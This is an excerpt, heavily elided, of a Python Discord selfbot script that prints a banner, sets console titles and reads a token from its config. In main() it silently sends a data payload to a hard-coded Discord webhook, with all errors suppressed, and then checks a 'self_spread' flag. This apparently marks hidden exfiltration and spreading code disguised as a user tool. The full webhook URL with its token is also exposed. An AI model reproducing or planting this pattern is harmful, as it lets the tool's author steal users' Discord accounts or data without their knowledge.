...
ctypes.windll.kernel32.SetConsoleTitleW(f'[Ema Selfbot v{SELFBOT.__version__}] | Loading...')
...
def startprint():
    ...
    print(f'''{Fore.RESET}
{Fore.RED}Ema's Discord Selfbot{Fore.RED}
                       ...
                       {Fore.CYAN}Creator: {Fore.GREEN}Ema#7777
    '''+Fore.RESET)
...
def Init():
    if config.get('token') == "token-here":
        ...
        try:
            ...
            os.system(f'title ( Selfbot) - Version {SELFBOT.__version__}')
...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/932186061004738580/vhL3CvTeHZDxW7e5UcmgmS-N3YhIZtmc3YtJA00S6ertUb2tRb23tsQ6xIpKQGrSvUoF", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
...
async def on_connect():
    ...
    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Ema Selfbot v{SELFBOT.__version__}] | Logged in as {Alucard.user.name}')
